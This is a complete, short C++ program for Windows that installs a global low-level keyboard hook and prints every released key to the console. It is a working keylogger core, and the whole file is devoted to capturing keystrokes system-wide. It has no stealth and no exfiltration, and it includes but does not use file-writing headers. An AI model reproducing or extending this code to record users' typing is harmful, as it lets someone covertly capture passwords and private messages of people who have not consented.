
#include "stdafx.h"
#include <ostream>
#include <Windows.h>
#include <sstream>
#include <fstream>
#include <iostream>
#include <string>

HHOOK hookHandle;

LRESULT CALLBACK keyHandler(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HC_ACTION) {
		KBDLLHOOKSTRUCT *pKbdLLHookStruct = (KBDLLHOOKSTRUCT *)lParam;

		if (wParam == WM_KEYUP) {
			// get key
			char key = (char)pKbdLLHookStruct->vkCode;
			printf("%c", key);

		}
	}
	
	return CallNextHookEx(hookHandle, code, wParam, lParam);
}


int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE instance = NULL;
	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyHandler, instance, 0);
	
	
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) != NULL) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hookHandle);
	
	return 0;
}

